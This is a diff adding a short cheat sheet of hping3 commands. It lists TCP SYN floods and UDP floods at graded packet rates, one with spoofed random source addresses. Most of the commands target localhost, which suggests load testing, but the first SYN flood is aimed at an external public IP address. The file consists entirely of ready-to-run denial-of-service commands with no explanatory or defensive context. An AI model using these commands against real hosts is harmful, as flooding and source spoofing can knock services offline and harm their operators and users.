@@ -1,0 +1,28 @@
+# hping3
+
+#TCP syn flood, 3kpps, ~110kbps
+sudo hping3 -i u1000 -S -p 80 -L 0 80.97.238.77
+
+#TCP syn flood, 5kpps, ~220kbps
+sudo hping3 -i u500 -S -p 80 -L 0 127.0.0.1
+
+#TCP syn flood, 5kpps, ~2.3Mbps
+sudo hping3 -i u500 -S -p 80 -L 0 127.0.0.1 -d 1200
+
+#TCP syn flood, 24kpps, ~10Mbps
+sudo hping3 -i u100 -S -p 80 -L 0 127.0.0.1 -d 1200
+
+
+#UDP flood, 16kpps, ~14Mbps
+sudo hping3 -i u100 -2 -p 80 127.0.0.1 -d 1200
+
+#UDP flood, 50kpps, ~50Mbps
+sudo hping3 -i u20 -2 -p 80 127.0.0.1 -d 1200
+
+#UDP flood, 110kpps, 100Mbps
+sudo hping3 -i u10 -2 -p 80 127.0.0.1 -d 1200
+
+#UDP flood, 10kpps, ~14Mbps, random source
+sudo hping3 -i u100 -2 -p 80 127.0.0.1 -d 1200 --rand-source
+
+
